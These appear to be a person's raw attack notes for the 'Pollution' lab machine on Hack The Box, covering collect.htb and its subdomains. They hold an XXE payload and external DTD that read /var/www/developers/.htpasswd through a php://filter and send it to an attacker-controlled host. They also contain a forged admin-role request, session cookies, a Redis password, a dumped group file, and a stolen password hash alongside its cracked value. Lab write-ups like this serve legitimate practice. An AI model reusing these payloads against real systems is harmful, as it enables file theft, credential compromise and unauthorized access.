# Pollution

10.129.104.111

### DNS NAMES

```
pollution.htb collect.htb forum.collect.htb developer.collect.htb
```

### USERNAMES

```
John
victor
Administrator
sysadmin
jeorge
jane
karldev
lyon
```

[http://collect.htb/set/role/admin](http://collect.htb/set/role/admin)\
248dssv2enlu57tlq3qq1vktop\
fma39a62b5kpt2aelk6cvoll44\
fma39a62b5kpt2aelk6cvoll44\
90cjpnjnundsfc047naokk28n6\
\
alienwerx\
viper\


```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.15.80/alien.dtd"> %xxe; ]>
```

```
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf
```

```
$routes = [
    "/" => "controllers/index.php",
    "/login" => "controllers/login.php",
    "/register" => "controllers/register.php",
    "/home" => "controllers/home.php",
    "/admin" => "controllers/admin.php",
    "/api" => "controllers/api.php",
    "/set/role/admin" => "controllers/set_role_admin.php",
    "/logout" => "controllers/logout.php"
];

$uri = Uri::load();
require Routes::load($uri, $routes);
```

```
POST /api HTTP/1.1
Host: collect.htb
Content-Length: 261
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://collect.htb
Referer: http://collect.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=fma39a62b5kpt2aelk6cvoll44
Connection: close

manage_api=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.15.80/alien.dtd"> %xxe; ]>
<root><method>POST</method><uri>/auth/register</uri><user><username>alienwerx</username><password>viper</password></user></root>
```

```
<?php
ini_set('session.save_handler','redis');
ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');

session_start();

require '../vendor/autoload.php';
```



```
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:pulse
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
input:x:104:
kvm:x:105:
render:x:106:
crontab:x:107:
netdev:x:108:
tss:x:109:
messagebus:x:110:
systemd-timesync:x:111:
ssh:x:112:
bluetooth:x:113:
ssl-cert:x:114:
avahi-autoipd:x:115:
rtkit:x:116:
avahi:x:117:
lpadmin:x:118:
pulse:x:119:
pulse-access:x:120:
scanner:x:121:saned
saned:x:122:
colord:x:123:
geoclue:x:124:
Debian-gdm:x:125:
systemd-coredump:x:999:
mysql:x:126:
victor:x:1002:
vboxsf:x:998:
redis:x:127:
_laurel:x:997:

```

```
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/developers/.htpasswd'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.15.80/?file=%file;'>">
%eval;
%exfiltrate;
```

```
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
```

```
r0cket
```

```
developer.collect.htb c8qpagve6l7qjcr1satfobj2h3
```

superalien viper
